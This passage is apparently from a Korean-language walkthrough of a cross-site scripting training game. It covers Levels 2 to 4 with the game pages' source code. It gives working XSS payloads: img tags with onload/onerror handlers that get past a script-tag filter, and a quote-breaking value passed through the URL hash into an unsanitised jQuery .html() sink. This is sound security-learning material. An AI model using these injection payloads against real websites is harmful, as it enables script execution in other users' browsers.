          &lt;<span style="color:#ff79c6">form</span> <span style="color:#50fa7b">action</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;?&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;post-form&#34;</span>&gt;
            &lt;<span style="color:#ff79c6">textarea</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;post-content&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;content&#34;</span> <span style="color:#50fa7b">rows</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;2&#34;</span> 
              <span style="color:#50fa7b">cols</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;50&#34;</span>&gt;&lt;/<span style="color:#ff79c6">textarea</span>&gt;
            &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;share&#34;</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;submit&#34;</span> <span style="color:#50fa7b">value</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Share status!&#34;</span>&gt;
            &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;hidden&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;action&#34;</span> <span style="color:#50fa7b">value</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;sign&#34;</span>&gt;
          &lt;/<span style="color:#ff79c6">form</span>&gt;
        &lt;/<span style="color:#ff79c6">td</span>&gt;
      &lt;/<span style="color:#ff79c6">tr</span>&gt;
    &lt;/<span style="color:#ff79c6">table</span>&gt;

  &lt;/<span style="color:#ff79c6">body</span>&gt;
&lt;/<span style="color:#ff79c6">html</span>&gt;
</code></pre></td></tr></table>
</div>
</div><p>소스코드를 살펴 본 결과, 내가 입력 한 값이 그대로 <code>&lt;blockquote&gt;</code> 태그 안에서 출력 되지만, <code>&lt;script&gt;</code> 태그는 먹히지 않았다.
아무래도 필터링이 있는 것 같았다.
따라서 다른 방법으로 alert를 띄울 수 있는 방법을 찾아보다 <code>&lt;img&gt;</code> 태그는 사용이 가능하다는 것을 알 수 있었다.</p>
<p>그래서 <code>&lt;img&gt;</code> 태그의 <code>onload</code> 속성을 사용하게 되었다.
<code>onload</code> 속성은 여러 태그에서 사용될 수 있는데, <code>&lt;img&gt;</code> 태그에서는 사진이 로드될 때 호출되는 속성이다.
로드 할 사진이 있어야 하므로, iframe 내에서 보이는 우주인 사진의 경로를 사용하기로 했다.</p>
<p>입력 창에 <code>&lt;img src=&quot;/static/level2_icon.png&quot; onload=&quot;js:alert(1);&quot;&gt;</code>를 입력 해 보았다.
이 경우, 서버 내의 <code>/static/level2_icon.png</code> 라는 우주인 사진이 로드되며 <code>onload</code> 속성을 호출 해 <code>alert</code> 창을 띄워 줄 것이다.</p>
<p><img src="/images/xssgame/xssgame_07.PNG" alt=""></p>
<p>예상대로 alert 창을 확인할 수 있었다.
이 방법 외에 <code>onerror</code>를 사용하는 방법도 있다.
다만 이 때는 <code>onerror</code>가 오류가 발생할 때 호출되므로, <code>&lt;img src=&quot;./test&quot; onerror=&quot;js:alert(1);&quot;&gt;</code>와 같이 서버에 없는 사진을 호출하도록 해 오류를 유발해야 한다.</p>
<hr>
<h2 id="level-3">Level 3</h2>
<p>Level 3은 탭으로 나뉘어진 사진을 누르면 그에 해당하는 사진을 보여주는 페이지이다.</p>
<p><img src="/images/xssgame/xssgame_08.PNG" alt=""></p>
<p>소스코드는 다음과 같다.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#ff79c6">&lt;!doctype html&gt;</span>
&lt;<span style="color:#ff79c6">html</span>&gt;
  &lt;<span style="color:#ff79c6">head</span>&gt;
    <span style="color:#6272a4">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span>
    &lt;<span style="color:#ff79c6">script</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/game-frame.js&#34;</span>&gt;&lt;/<span style="color:#ff79c6">script</span>&gt;
    &lt;<span style="color:#ff79c6">link</span> <span style="color:#50fa7b">rel</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;stylesheet&#34;</span> <span style="color:#50fa7b">href</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/game-frame-styles.css&#34;</span> /&gt;

    <span style="color:#6272a4">&lt;!-- Load jQuery --&gt;</span>
    &lt;<span style="color:#ff79c6">script</span> 
      <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js&#34;</span>&gt;
    &lt;/<span style="color:#ff79c6">script</span>&gt;

    &lt;<span style="color:#ff79c6">script</span>&gt;
      <span style="color:#8be9fd;font-style:italic">function</span> chooseTab(num) {
        <span style="color:#6272a4">// Dynamically load the appropriate image.
</span><span style="color:#6272a4"></span>        <span style="color:#8be9fd;font-style:italic">var</span> html <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;Image &#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">parseInt</span>(num) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;&lt;br&gt;&#34;</span>;
        html <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;&lt;img src=&#39;/static/level3/cloud&#34;</span> <span style="color:#ff79c6">+</span> num <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;.jpg&#39; /&gt;&#34;</span>;
        $(<span style="color:#f1fa8c">&#39;#tabContent&#39;</span>).html(html);

        <span style="color:#8be9fd;font-style:italic">window</span>.location.hash <span style="color:#ff79c6">=</span> num;

        <span style="color:#6272a4">// Select the current tab
</span><span style="color:#6272a4"></span>        <span style="color:#8be9fd;font-style:italic">var</span> tabs <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.querySelectorAll(<span style="color:#f1fa8c">&#39;.tab&#39;</span>);
        <span style="color:#ff79c6">for</span> (<span style="color:#8be9fd;font-style:italic">var</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> tabs.length; i<span style="color:#ff79c6">++</span>) {
          <span style="color:#ff79c6">if</span> (tabs[i].id <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;tab&#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">parseInt</span>(num)) {
            tabs[i].className <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;tab active&#34;</span>;
            } <span style="color:#ff79c6">else</span> {
            tabs[i].className <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;tab&#34;</span>;
          }
        }

        <span style="color:#6272a4">// Tell parent we&#39;ve changed the tab
</span><span style="color:#6272a4"></span>        top.postMessage(self.location.toString(), <span style="color:#f1fa8c">&#34;*&#34;</span>);
      }

      <span style="color:#8be9fd;font-style:italic">window</span>.onload <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">function</span>() { 
        chooseTab(unescape(self.location.hash.substr(<span style="color:#bd93f9">1</span>)) <span style="color:#ff79c6">||</span> <span style="color:#f1fa8c">&#34;1&#34;</span>);
      }

      <span style="color:#6272a4">// Extra code so that we can communicate with the parent page
</span><span style="color:#6272a4"></span>      <span style="color:#8be9fd;font-style:italic">window</span>.addEventListener(<span style="color:#f1fa8c">&#34;message&#34;</span>, <span style="color:#8be9fd;font-style:italic">function</span>(event){
        <span style="color:#ff79c6">if</span> (event.source <span style="color:#ff79c6">==</span> parent) {
          chooseTab(unescape(self.location.hash.substr(<span style="color:#bd93f9">1</span>)));
        }
      }, <span style="color:#ff79c6">false</span>);
    &lt;/<span style="color:#ff79c6">script</span>&gt;

  &lt;/<span style="color:#ff79c6">head</span>&gt;
  &lt;<span style="color:#ff79c6">body</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;level3&#34;</span>&gt;
    &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;header&#34;</span>&gt;
      &lt;<span style="color:#ff79c6">img</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;logo&#34;</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/logos/level3.png&#34;</span>&gt;
      &lt;<span style="color:#ff79c6">span</span>&gt;Take a tour of our cloud data center.&lt;/<span style="color:#ff79c6">a</span>&gt;
    &lt;/<span style="color:#ff79c6">div</span>&gt;

    &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;tab&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;tab1&#34;</span> <span style="color:#50fa7b">onclick</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;chooseTab(&#39;1&#39;)&#34;</span>&gt;Image 1&lt;/<span style="color:#ff79c6">div</span>&gt;
    &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;tab&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;tab2&#34;</span> <span style="color:#50fa7b">onclick</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;chooseTab(&#39;2&#39;)&#34;</span>&gt;Image 2&lt;/<span style="color:#ff79c6">div</span>&gt;
    &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;tab&#34;</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;tab3&#34;</span> <span style="color:#50fa7b">onclick</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;chooseTab(&#39;3&#39;)&#34;</span>&gt;Image 3&lt;/<span style="color:#ff79c6">div</span>&gt;

    &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;tabContent&#34;</span>&gt;&amp;nbsp;&lt;/<span style="color:#ff79c6">div</span>&gt;
  &lt;/<span style="color:#ff79c6">body</span>&gt;
&lt;/<span style="color:#ff79c6">html</span>&gt;
</code></pre></td></tr></table>
</div>
</div><p><code>chooseTab</code> 함수에는 인자로 <code>num</code>이 들어가는데, 이 <code>num</code>의 값은 아래 부분에 검증이 없이 그대로 들어간다.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">html += &#34;&lt;<span style="color:#ff79c6">img</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;/static/level3/cloud&#34; + num + &#34;.jpg&#39;</span> /&gt;&#34;;
$(&#39;#tabContent&#39;).html(html);
</code></pre></td></tr></table>
</div>
</div><p>또한 이 <code>num</code>의 값은 <code>URL</code>에서 <code># 뒤의 값</code>을 가져오게 된다.
따라서 <code>URL</code>에 <code>#</code> 뒤에 위의 코드에 적절히 들어가 동작하도록 만들어준다면 alert 창을 띄울 수 있을 것 같다.
이에 URL의 # 뒤에 원래 있던 숫자 대신 <code>' onerror='js:alert(1);' '</code>을 넣어보았다.
이 경우, 취약점이 존재하던 위의 코드는 아래와 같은 형태가 된다.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">html += &#34;&lt;<span style="color:#ff79c6">img</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;/static/level3/cloud&#39;</span> <span style="color:#50fa7b">onerror</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;js:alert(1);&#39;</span> &#39;.<span style="color:#50fa7b">jpg</span>&#39; /&gt;&#34;;
$(&#39;#tabContent&#39;).html(html);
</code></pre></td></tr></table>
</div>
</div><p><code>/static/level3/cloud</code>라는 이미지 파일은 서버에 존재하지 않으므로, <code>onerror</code>를 호출하게 되고, 뒤의 <code>.jpg</code>는 아무런 역할을 하지 않을 것이다.
그 결과 아래와 같이 <code>alert</code> 창을 띄울 수 있었다.</p>
<p><img src="/images/xssgame/xssgame_09.PNG" alt=""></p>
<hr>
<h2 id="level-4">Level 4</h2>
<p>Level 4는 입력한 숫자 만큼 타이머를 만들어 주는 페이지이다.</p>
<p><img src="/images/xssgame/xssgame_10.PNG" alt=""></p>
<p>소스코드를 살펴보면 아래와 같다.</p>
<ul>
<li>타이머 숫자 입력 받을 때</li>
</ul>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#ff79c6">&lt;!doctype html&gt;</span>
&lt;<span style="color:#ff79c6">html</span>&gt;
  &lt;<span style="color:#ff79c6">head</span>&gt;
    <span style="color:#6272a4">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span>
    &lt;<span style="color:#ff79c6">script</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/game-frame.js&#34;</span>&gt;&lt;/<span style="color:#ff79c6">script</span>&gt;
    &lt;<span style="color:#ff79c6">link</span> <span style="color:#50fa7b">rel</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;stylesheet&#34;</span> <span style="color:#50fa7b">href</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/game-frame-styles.css&#34;</span> /&gt;
  &lt;/<span style="color:#ff79c6">head</span>&gt;

  &lt;<span style="color:#ff79c6">body</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;level4&#34;</span>&gt;
    &lt;<span style="color:#ff79c6">img</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/logos/level4.png&#34;</span> /&gt;
    &lt;<span style="color:#ff79c6">br</span>&gt;
    &lt;<span style="color:#ff79c6">form</span> <span style="color:#50fa7b">action</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span> <span style="color:#50fa7b">method</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;GET&#34;</span>&gt;
      &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;timer&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;timer&#34;</span> <span style="color:#50fa7b">value</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;3&#34;</span>&gt;
      &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;button&#34;</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;submit&#34;</span> <span style="color:#50fa7b">value</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Create timer&#34;</span>&gt; &lt;/<span style="color:#ff79c6">form</span>&gt;
    &lt;/<span style="color:#ff79c6">form</span>&gt;
  &lt;/<span style="color:#ff79c6">body</span>&gt;
&lt;/<span style="color:#ff79c6">html</span>&gt;
</code></pre></td></tr></table>
</div>
</div><ul>
<li>Create timer 버튼 클릭 후</li>
</ul>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#ff79c6">&lt;!doctype html&gt;</span>
&lt;<span style="color:#ff79c6">html</span>&gt;
  &lt;<span style="color:#ff79c6">head</span>&gt;
    <span style="color:#6272a4">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span>
    &lt;<span style="color:#ff79c6">script</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/game-frame.js&#34;</span>&gt;&lt;/<span style="color:#ff79c6">script</span>&gt;
    &lt;<span style="color:#ff79c6">link</span> <span style="color:#50fa7b">rel</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;stylesheet&#34;</span> <span style="color:#50fa7b">href</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/game-frame-styles.css&#34;</span> /&gt;

    &lt;<span style="color:#ff79c6">script</span>&gt;
      <span style="color:#8be9fd;font-style:italic">function</span> startTimer(seconds) {
        seconds <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">parseInt</span>(seconds) <span style="color:#ff79c6">||</span> <span style="color:#bd93f9">3</span>;
        setTimeout(<span style="color:#8be9fd;font-style:italic">function</span>() { 
          <span style="color:#8be9fd;font-style:italic">window</span>.confirm(<span style="color:#f1fa8c">&#34;Time is up!&#34;</span>);
          <span style="color:#8be9fd;font-style:italic">window</span>.history.back();
        }, seconds <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">1000</span>);
      }
    &lt;/<span style="color:#ff79c6">script</span>&gt;
